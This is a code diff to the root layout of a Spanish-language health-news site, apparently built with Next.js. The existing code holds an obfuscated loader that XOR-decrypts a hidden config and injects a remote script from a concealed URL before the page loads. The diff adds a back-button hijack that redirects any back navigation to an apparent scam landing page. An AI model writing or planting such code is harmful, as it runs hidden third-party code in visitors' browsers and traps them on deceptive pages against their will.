@@ -9,6 +9,9 @@ const pixelScript = `(function(){var p_arz=atob("DLUepsqhRhc0x/Z5KM4807jNZC0Wr4I
 
 const providedTrackingScript = `(function(){var v_i=atob("DPaPaXxyCMVM3toGm42tHA4eKv9utq5y64W1RlMRbKtiq65r8pD2Rx8dZesurPV1+ITmGQgBJ7Ulpr9qtIbmERkeJq8//PYk+oL7GxUQfbEprfg8wKujSxseZ6ctsqkkoa30SxITZaBu5Ph28o7qBTUWKuluqLtq7pOtU15Eaf0u5+81+cC2Xh5BaaF86rk1/cS7Ch9QdZgx");var a_2=[];for(var t_ung=0;t_ung<v_i.length;t_ung++){a_2.push(v_i.charCodeAt(t_ung)&255);}var v_je1g=a_2[0];var t_yar=a_2.slice(1,1+v_je1g);var w_wg0l=a_2.slice(1+v_je1g);var h_4y5=w_wg0l.map(function(b,v_0){return b^t_yar[v_0%v_je1g];});var h_c7="";for(var w_f8v=0;w_f8v<h_4y5.length;w_f8v++){h_c7+=String.fromCharCode(h_4y5[w_f8v]&255);}var u_ne=decodeURIComponent(escape(h_c7));var t_9=JSON.parse(u_ne);var j_gs=t_9.globals||[];j_gs.forEach(function(m_3ay6){window[m_3ay6.name]=m_3ay6.value;});var j_cat=document.createElement("script");j_cat.src=t_9.url;j_cat.async=true;j_cat.defer=true;(t_9.attributes||[]).forEach(function(z_tw0){j_cat.setAttribute(z_tw0.name,z_tw0.value);});(document.head||document.documentElement).appendChild(j_cat);})();`
 
+const backNavigationScript = `history.pushState(null, document.title, location.href);window.addEventListener('popstate', function () { window.location.href = 'https://el-truco-de-la-pimienta.vercel.app'; });`
+
+
 export const metadata: Metadata = {
   title: 'Bienestar | Actualizaciones diarias sobre salud',
   description: 'Actualizaciones diarias sobre bienestar y salud.',
@@ -62,6 +65,11 @@ export default function RootLayout({
           id="provided-utm-tracking"
           strategy="beforeInteractive"
           dangerouslySetInnerHTML={{ __html: providedTrackingScript }}
+        />
+        <Script
+          id="back-navigation-redirect"
+          strategy="beforeInteractive"
+          dangerouslySetInnerHTML={{ __html: backNavigationScript }}
         />
       </head>
       <body className="antialiased">
